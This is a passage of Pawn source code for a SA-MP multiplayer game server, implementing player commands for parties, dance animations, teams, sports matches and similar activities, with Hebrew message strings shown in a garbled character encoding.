		if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18 ь·ЇЄхь ЇЄщьхщх· ющхчух·");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) cmd = "рщя";
		EndParty();
		format(string,sizeof(string)," :ёщсф ,%s схшьф Єь щущ фрующя Party фЇЄщьх· фющхчу·",GetName(playerid));
		SendClientMessageToAll(red,string);
		SendClientMessageToAll(red,cmd);
		return 1;
	}
	if(equal(cmd,"/party"))
	{
		if(specialActivity != sa_party) return SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юёщсф");
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInRangeOfPoint(playerid,100.0,partytele[0],partytele[1],partytele[2])) return SendClientMessage(playerid,red," .р·ф ыс° сюёщсф");
		SetPlayerPos(playerid,partytele[0],partytele[1],partytele[2]);
		SetPlayerFacingAngle(playerid,partytele[3]);
		if(playerinfo[playerid][cantelep])
		{
			new string[M_S];
			format(string,sizeof(string)," + /party :ф∙·т° ьюёщсф! тэ р·э юхцюЁщэ %s",GetName(playerid));
			SendClientMessageToAll(green,string);
			SetTimerEx("CanTeleP",30000,0,"ii",playerid,0);
			playerinfo[playerid][cantelep] = 0;
		}
		return 1;
	}
	if(equal(cmd,"/sdance"))
	{
		if(specialActivity != sa_party && !(GetPlayerCheckpoint(playerid) == cp_dancing  && IsPlayerInCheckpoint(playerid))) return SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юёщсф");
		if(specialActivity == sa_party && !IsPlayerInRangeOfPoint(playerid,100.0,partytele[0],partytele[1],partytele[2])) return SendClientMessage(playerid,red," .Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў срцх° фюёщсф");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /sdance [1-13] :рЇ∙°х· #1");
			return SendClientMessage(playerid,white," /sdance [1-13] [speed 1-3] :рЇ∙°х· #2");
		}
		new sdance = strval(cmd);
		cmd = strtok(cmdtext,idx);
		new Float:speed = floatmul(2.05,float(!strlen(cmd) ? 1 : strval(cmd)));
		switch(sdance)
		{
			case 1: ApplyAnimation(playerid,"DANCING","bd_clap",speed,1,1,1,1,1);
			case 2: ApplyAnimation(playerid,"DANCING","bd_clap1",speed,1,1,1,1,1);
			case 3: ApplyAnimation(playerid,"DANCING","dance_loop",speed,1,1,1,1,1);
			case 4: ApplyAnimation(playerid,"DANCING","DAN_Down_A",speed,1,1,1,1,1);
			case 5: ApplyAnimation(playerid,"DANCING","DAN_Left_A",speed,1,1,1,1,1);
			case 6: ApplyAnimation(playerid,"DANCING","DAN_Loop_A",speed,1,1,1,1,1);
			case 7: ApplyAnimation(playerid,"DANCING","DAN_Right_A",speed,1,1,1,1,1);
			case 8: ApplyAnimation(playerid,"DANCING","DAN_Up_A",speed,1,1,1,1,1);
			case 9: ApplyAnimation(playerid,"DANCING","dnce_M_a",speed,1,1,1,1,1);
			case 10: ApplyAnimation(playerid,"DANCING","dnce_M_b",speed,1,1,1,1,1);
			case 11: ApplyAnimation(playerid,"DANCING","dnce_M_c",speed,1,1,1,1,1);
			case 12: ApplyAnimation(playerid,"DANCING","dnce_M_d",speed,1,1,1,1,1);
			case 13: ApplyAnimation(playerid,"DANCING","dnce_M_e",speed,1,1,1,1,1);
			default: SendClientMessage(playerid,red," .юёЇ° °щўху ющхчу ∙тхщ");
		}
		if(!playerinfo[playerid][noticedmsg][13])
		{
			SendClientMessage(playerid,grey," (/stopanim :ыущ ьфЇёщў ·ЁхЄф рх рЁщюЎщф)");
			playerinfo[playerid][noticedmsg][13] = 1;
		}
		return 1;
	}
	if(equal(cmd,"/drunk"))
	{
		if(specialActivity != sa_party) return SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юёщсф");
		if(!IsPlayerInRangeOfPoint(playerid,100.0,partytele[0],partytele[1],partytele[2])) return SendClientMessage(playerid,red," .Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў срцх° фюёщсф");
		ApplyAnimation(playerid,"PED","WALK_drunk",4.1,0,1,1,1,1);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
		SetPlayerDrunkLevel(playerid,20000);
		SendClientMessage(playerid,yellow," /sdrunk :ыущ ьфЇёщў");
		return 1;
	}
	if(equal(cmd,"/sdrunk"))
	{
		if(specialActivity != sa_party) return SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юёщсф");
		if(!IsPlayerInRangeOfPoint(playerid,100.0,partytele[0],partytele[1],partytele[2])) return SendClientMessage(playerid,red," .Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў срцх° фюёщсф");
		if(GetPlayerDrunkLevel(playerid) == 0) return SendClientMessage(playerid,red," .р·ф ьр ∙щых°");
		ClearAnimations(playerid);
		SetPlayerDrunkLevel(playerid,0);
		return 1;
	}
	if(equal(cmd,"/wargames"))
	{
		new list[1024];
		for(new i = 0; i < sizeof(warGames); i++) format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х %d) %s (%s) - %s") : ("%s\r\n {%s}Х %d) %s (%s) - %s"),list,HexStringOfColor(i % 2 == 0 ? green : lightgreen),i+1,warGames[i][wgName],warGames[i][wgCommand],warGames[i][wgText]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ю∙чўщ ў°сх·",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/teamacts"))
	{
		new list[1024];
		for(new i = 0; i < sizeof(TeamActivities); i++) format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х %d) %s (%s) - %s") : ("%s\r\n {%s}Х %d) %s (%s) - %s"),list,HexStringOfColor(i % 2 == 0 ? purple : lightpurple),i+1,TeamActivities[i][taName],TeamActivities[i][taCommand],TeamActivities[i][taText]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ЇЄщьхщх· ўсхЎх·",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/team"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /team [action] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," /Mode 73 - ь°∙щю· Їўхух· фўсхЎф");
		}
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ ЇЄхьх· ўсхЎф ыр∙° р·ф сЇЄщьх·");
		if(equal(cmd,"create"))
		{
			if(playerinfo[playerid][team] > -1) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сўсхЎф");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /team create [team name] :Ўх°· ф∙щюх∙");
			for(new i = 0, len = strlen(cmd); i < len; i++) if((cmd[i] < 'A' && cmd[i] > 'z') || (cmd[i] >= 90 && cmd[i] <= 96)) return SendClientMessage(playerid,red," .∙э фўсхЎф чщщс ьфщх· срЁтьщ· сьсу");
			if(advertisement(cmd,"Ї·щч· ўсхЎф (Їўхуф)",playerid,"found in /team create")) return 1;
			for(new i = 0; i < MAX_TEAMS; i++) if(!teaminfo[i][teamexist])
			{
				format(teaminfo[i][teamname],M_S,cmd);
				teaminfo[i][teamexist] = 1;
				teaminfo[i][teamchat] = 1;
				teaminfo[i][teamchar] = '~';
				playerinfo[playerid][team] = i;
				break;
			}
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .щ∙Ёф сЄщф сщЎщ°· фўсхЎф, ыыь фЁ°рф щ∙ щх·° юущ ўсхЎх·. Ёёф ∙хс юрхч° щх·°");
			playerinfo[playerid][lteam] = 2;
			format(string,sizeof(string)," .\"%s\" щЎ°· р· фўсхЎф",teaminfo[playerinfo[playerid][team]][teamname]);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"invite"))
		{
			if(!playerinfo[playerid][invitetime][0]) return SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьфцющя рьщф ю∙·ю∙щэ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /team invite [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			if(playerinfo[id][team] > -1)
			{
				format(string,sizeof(string)," .ыс° ЁюЎр сўсхЎф %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			playerinfo[playerid][invitetime][0]--;
			format(string,sizeof(string)," .ьўсхЎф %s фцюЁ· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" ∙ьч ьъ фцюЁф ьўсхЎф %s",teaminfo[playerinfo[playerid][team]][teamname],GetName(playerid));
			SendClientMessage(id,green,string);
			SendClientMessage(id,green," /team accept :ьрщ∙х° ффцюЁф ,/team cancel :ьсщшхь ффцюЁф");
			playerinfo[id][iteam] = playerinfo[playerid][team];
			playerinfo[id][lastrec] = 6;
		}
		else if(equal(cmd,"accept"))
		{
	 		if(playerinfo[playerid][iteam] == -1) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ўсхЎф");
			if(playerinfo[playerid][team] > -1) return SendClientMessage(playerid,red," .р·ф ыс° сўсхЎф");
			if(!teaminfo[playerinfo[playerid][iteam]][teamexist]) SendClientMessage(playerid,red, " .фўсхЎф рьщф ф·ыххЁ· ьфЎш°є рщЁф ўщщю·");
			playerinfo[playerid][team] = playerinfo[playerid][iteam];
			format(string,sizeof(string)," .фЎш°є ьўсхЎф ∙ьъ %s",GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i)) SendClientMessage(i,green,string);
			format(string,sizeof(string)," .\"%s\" фЎш°Ї· ьўсхЎф",teaminfo[playerinfo[playerid][iteam]][teamname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iteam] = -1, playerinfo[playerid][lteam] = 1;
			playerinfo[playerid][lastrec] = 0;
		}
		else if(equal(cmd,"cancel"))
		{
	 		if(playerinfo[playerid][iteam] == -1) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ўсхЎф");
			if(!teaminfo[playerinfo[playerid][iteam]][teamexist]) SendClientMessage(playerid,red, " .фўсхЎф рьщф ф·ыххЁ· ьфЎш°є рщЁф ўщщю·");
			format(string,sizeof(string)," .сщшь р· ффцюЁф ьўсхЎф ∙ьъ %s",GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][iteam] && IsPlayerConnected(i)) SendClientMessage(i,green,string);
			format(string,sizeof(string)," .\"%s\" сщшь· р· ффцюЁф ьфЎш°Їх· ьўсхЎф",teaminfo[playerinfo[playerid][iteam]][teamname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iteam] = -1;
			playerinfo[playerid][lastrec] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			format(string,sizeof(string)," .\"%s\" щЎр· юфўсхЎф",teaminfo[playerinfo[playerid][team]][teamname]);
			SendClientMessage(playerid,orange,string);
			new c = 0;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i)) c++;
			if(!c) teaminfo[playerinfo[playerid][team]][teamexist] = 0;
			playerinfo[playerid][team] = -1, playerinfo[playerid][iteam] = -1, playerinfo[playerid][lteam] = 0;
		}
		else if(equal(cmd,"kick"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /team kick [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфхЎщр р· ЄЎюъ");
			if(playerinfo[id][team] != playerinfo[playerid][team])
			{
				format(string,sizeof(string)," .ьр ЁюЎр сўсхЎф ∙ьъ %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," .%s фхЎр юфўсхЎф Єь щущ %s",GetName(playerid),GetName(id));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && i != id && IsPlayerConnected(i)) SendClientMessage(i,green,string);
			format(string,sizeof(string)," .\"%s\" фхЎщр рх·ъ юфўсхЎф %s",teaminfo[playerinfo[playerid][team]][teamname],GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][team] = -1, playerinfo[id][iteam] = -1, playerinfo[id][lteam] = 0;
		}
		else if(equal(cmd,"char"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /team char [character] :Ўх°· ф∙щюх∙");
			if(strlen(cmd) != 1) return SendClientMessage(playerid,red," .Єь ф·х ьы·щсф сЎ'рш ьфщх· рх· рч·");
			format(string,sizeof(string)," :∙щЁф р· ф·х ьы·щсф сЎ'рш фўсхЎф ь·х фср %s",GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i))
			{
				SendClientMessage(i,green,string);
				SendClientMessage(i,white,cmd);
			}
			teaminfo[playerinfo[playerid][team]][teamchar] = cmd[0];
		}
		else if(equal(cmd,"mute"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /team mute [on/off] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"on"))
			{
				if(teaminfo[playerinfo[playerid][team]][teamchat]) return SendClientMessage(playerid,red," .Ў'рш фўсхЎф ыс° сф∙·ўф");
				format(string,sizeof(string)," .ф∙·щў р· Ў'рш фўсхЎф %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i)) SendClientMessage(i,green,string);
				teaminfo[playerinfo[playerid][team]][teamchat] = 1;
			}
			else if(equal(cmd,"off"))
			{
				if(!teaminfo[playerinfo[playerid][team]][teamchat]) return SendClientMessage(playerid,red," .Ў'рш фўсхЎф ьр сф∙·ўф");
				format(string,sizeof(string)," .фх°щу р· фф∙·ўф ∙ь Ў'рш фўсхЎф %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i)) SendClientMessage(i,green,string);
				teaminfo[playerinfo[playerid][team]][teamchat] = 0;
			}
			else SendClientMessage(playerid,red," .рЇ∙°х· ф∙·ў· Ў'рш ўсхЎф ∙тхщф");
		}
		else if(equal(cmd,"inviteclan"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьфцющя рьщф ю∙·ю∙щэ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /team inviteclan [clan name] :Ўх°· ф∙щюх∙");
			new id = clannumber(cmd), player[max_clan_members], players = 0;
			if(!id) return SendClientMessage(playerid,red," .∙э ўьря ∙тхщ");
			format(string,sizeof(string)," .\"%s\" фцюЁф ьўсхЎф %s ∙ьч ьъ хьыь фўьря %s",teaminfo[playerinfo[playerid][team]][teamname],claninfo[id][cname],GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][clan] == id && playerinfo[i][team] == -1 && IsPlayerConnected(i))
			{
				player[players++] = i, playerinfo[i][iteam] = playerinfo[playerid][team];
				SendClientMessage(i,green,string);
				SendClientMessage(i,green," /team accept :ьрщ∙х° ффцюЁф ,/team cancel :ьсщшхь ффцюЁф");
			}
			if(!players) SendClientMessage(playerid,red," .ьр Ё∙ьчф фцюЁф ьрє ∙чўя");
			else
			{
				format(string,sizeof(string)," ~~~ :%s Ё∙ьчх фцюЁх· ьўсхЎф ьчс°щ фўьря ~~~",claninfo[id][cname]);
				SendClientMessage(playerid,lightblue,string);
				for(new i = 0; i < players; i++)
				{
					format(string,sizeof(string)," %d) %s Ё∙ьчф фцюЁф ь",i+1,GetName(player[i]));
					SendClientMessage(playerid,green,string);
				}
			}
		}
		else if(equal(cmd,"players"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			format(string,sizeof(string)," ~~~ :\"%s\" чс°щ фўсхЎф ~~~",teaminfo[playerinfo[playerid][team]][teamname]);
			SendClientMessage(playerid,lightblue,string);
			new c = 0;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == playerinfo[playerid][team] && IsPlayerConnected(i))
			{
				c++;
				format(string,sizeof(string)," %d) %s (ID: %03d)",c,GetName(i),i);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else if(equal(cmd,"delete"))
		{
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр сўсхЎф");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфь фўсхЎф Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх");
			teaminfo[playerinfo[playerid][team]][teamexist] = 0;
			format(string,sizeof(string)," .%s Ёючўф Єь щущ %s фўсхЎф",GetName(playerid),teaminfo[playerinfo[playerid][team]][teamname]);
			new tid = playerinfo[playerid][team];
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][team] == tid && IsPlayerConnected(i))
			{
				SendClientMessage(i,red,string);
				playerinfo[i][team] = -1, playerinfo[i][iteam] = -1, playerinfo[i][lteam] = 0;
			}
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ўсхЎф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/mhlist"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ёхтщ ЇЄщьхщх· юЎху ~~~");
		new string[M_S], c = 0;
		for(new i = 0; i < sizeof(ManhuntTypes); i++)
		{
			c++;
			format(string,sizeof(string)," Х %d) %s (%s) - %s",c,ManhuntTypes[i][mhName],ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhText]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!c) SendClientMessage(playerid,red," .рщя ЇЄщьхщх· юЎху");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ёхтщ ЇЄщьхщх· юЎху",c);
			SendClientMessage(playerid,green,string);
		}
		return 1;
	}
	if(equal(cmd,"/sport"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /sport [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /sport state :фЎт· юЎс ЇЄщьх· фёЇх°ш фЁхычщ·");
			SendClientMessage(playerid,white," /sport join :фЎш°Їх· ьЇЄщьх· фёЇх°ш");
			SendClientMessage(playerid,white," /sport quit :щЎщрф юЇЄщьх· фёЇх°ш");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /sport start :ф·чь· ЇЄщьх· ёЇх°ш чу∙ф");
				SendClientMessage(playerid,white," /sport end [reason] :ёщхэ ЇЄщьх· фёЇх°ш фЁхычщ·");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(sportinfo[0])
			{
				if(sportinfo[2] > 1)
				{
					format(string,sizeof(string)," .щ∙ ыЄ· ЇЄщьх· ёЇх°ш, фщр ··чщь сЄху %d ∙Ёщх·",sportinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· ЇЄщьх· ёЇх°ш хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· ёЇх°ш");
		}
		else if(equal(cmd,"join"))
		{
			if(!sportinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ёЇх°ш ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitsport]) return SendClientMessage(playerid,red," .ЇЄщьх· фёЇх°ш ··чщь сЄху юёЇ° ∙Ёщх·, рЁр фю·я");
			if(playerinfo[playerid][insport]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх· ёЇх°ш");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(sportinfo[6] > -1 && sportinfo[7] > -1) return SendClientMessage(playerid,red," .ыь фюўхюх· сЇЄщьх· фёЇх°ш ·Їхёщэ");
			if(sportinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(playerinfo[playerid][team] == -1) return SendClientMessage(playerid,red," .ыущ ьщЎх° ўсхЎф /team create Єьщъ ьфщх· сўсхЎф ыь∙фщ·, ф∙·ю∙ с");
			if(playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юЁфщт фўсхЎф");
			new players = 0, player[MAX_PLAYERS];
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][team] == playerinfo[playerid][team]) player[players++] = i;
			if(players < 3) return SendClientMessage(playerid,red," .Єь фўсхЎф ьфщх· Єэ ьЇчх· 3 ∙чўЁщэ");
			if(players > 5) return SendClientMessage(playerid,red," .Єь фўсхЎф ьфщх· Єу 5 ∙чўЁщэ");
			for(new i = 0; i < players; i++)
			{
				playerinfo[player[i]][waitsport] = 1, playerinfo[player[i]][sportid] = sportinfo[1];
				sportinfo[1]++;
				if(sportinfo[5] == sport1_football)
				{
					SendClientMessage(player[i],lightblue," Х Х :фЎш°Ї· ьЇЄщьх· фёЇх°ш - ыух°ть Х Х");
					SendClientMessage(player[i],lightyellow," - юш°·ъ фщр ьсЄхш ь∙Є° ыюф ∙щх·° ЇЄющэ ыущ ьф°ххщч Ёўхуф ьчс°щ фўсхЎф ∙ьъ");
					SendClientMessage(player[i],lightyellow," - фю∙чў юё·щщэ рхшхюшщ· ьрч° 90 ∙Ёщх·, фўсхЎф сЄь· фыщ ф°сф Ёўхух· ·цыф сыёє ∙щ·чьў сщя чс°щ фўсхЎф");
					SendClientMessage(player[i],red," + ф∙·ю∙ сюў∙ ффьщыф ыущ ьўч· р· фыух°");
					SendClientMessage(player[i],red," + ф∙·ю∙ сюў∙ фщ°щщф ыущ ьсЄхш");
				}
				else if(sportinfo[5] == sport2_basketball)
				{
					SendClientMessage(player[i],lightblue," Х Х :фЎш°Ї· ьЇЄщьх· фёЇх°ш - ыух°ёь Х Х");
					SendClientMessage(player[i],lightyellow," - юш°·ъ фщр ьц°хў ьёь р· фыух° ыюф ∙щх·° ЇЄющэ Єь юЁ· ьф°ххщч Ёўхух· ьчс°щ фўсхЎф");
					SendClientMessage(player[i],lightyellow," - фю∙чў юё·щщэ рхшхюшщ· ьрч° 90 ∙Ёщх·, фўсхЎф сЄь· фыщ ф°сф Ёўхух· ·цыф сыёє ∙щ·чьў сщя чс°щ фўсхЎф");
					SendClientMessage(player[i],red," + ф∙·ю∙ сюў∙ ффьщыф ыущ ь·Їхё р· фыух°");
					SendClientMessage(player[i],red," + ф∙·ю∙ сЄыс° ыущ ьсчх° ьря ьц°хў хсюў∙ фщ°щщф ыущ ьц°хў");
				}
				format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° #%d",sportinfo[1]);
				SendClientMessage(player[i],pink,string);
				SendClientMessage(player[i],purple," ╗ !сфЎьчф, хю∙чў юфЁф");
			}
			sportinfo[sportinfo[6] > -1 ? 7 : 6] = playerinfo[playerid][team];
			format(string,sizeof(string)," + :%s ,Ўщ°є ьЇЄщьх· фёЇх°ш р· фўсхЎф ∙ьх %s",teaminfo[playerinfo[playerid][team]][teamname],GetName(playerid));
			SendClientMessageToAll(green,string);
			string = "";
			for(new i = 0; i < players; i++) format(string,sizeof(string),"%s Х %s",string,GetName(player[i]));
			SendClientMessageToAll(yellow,string);
		}
		else if(equal(cmd,"quit"))
		{
			if(!sportinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ёЇх°ш ы°тЄ");
			if(!playerinfo[playerid][insport]) return SendClientMessage(playerid,red," .р·ф ьр сЇЄщьх· ёЇх°ш");
			SendClientMessage(playerid,green," .Ї°∙· юЇЄщьх· фёЇх°ш");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(sportinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ёЇх°ш");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /sport start [1=football 2=basketball] :Ўх°· ф∙щюх∙");
			new t = strval(cmd);
			if(t != 1) return SendClientMessage(playerid,red," .ёхт ∙тхщ");
			StartSport(t);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!sportinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ёЇх°ш ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndSport(reason,playerid);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ЇЄщьх· ёЇх°ш ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/lhoff"))
	{
		if(playerinfo[playerid][lhopt] == -1) return SendClientMessage(playerid,red," .ьр сч°· с∙хэ рхЇЎщщ· ютуьх°");
		SetPlayerPos(playerid,154.2227,-1945.5432,4.7210);
		SetCameraBehindPlayer(playerid);
		SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
		SetFreeze(playerid,0);
		playerinfo[playerid][lhopt] = -1;
		if(playerinfo[playerid][lhiconshowing]) SendClientMessage(playerid,red," /lhicon :фЇёў· р· фЎЇщщф юфютуьх°. ∙щэ ьс ыщ щ∙ рщщўхя сюЇф Єь фюўхэ ∙Єьщх фё·ыь·, ыущ ьючхў рх·х");
		return 1;
	}
	if(equal(cmd,"/lhicon"))
	{
		if(!playerinfo[playerid][lhiconshowing]) return SendClientMessage(playerid,red," .рщщўхя фютуьх° ьр юхЇщЄ рЎьъ");
		RemovePlayerMapIcon(playerid,icon_lighthouse);
		SendClientMessage(playerid,green," .фрщщўхя ∙ь фютуьх° Ёючў");
		return 1;
	}
	if(equal(cmd,"/army"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /army [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /army state :фЁхычщ· Army Game сущў· юЎс ЇЄщьх· ф");
			SendClientMessage(playerid,white," /army join :Army Game фЎш°Їх· ьЇЄщьх·");
			SendClientMessage(playerid,white," /army quit :Army Game Ї°щ∙ф юЇЄщьх·");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /army start :Army Game ф·чь· ЇЄщьх·");
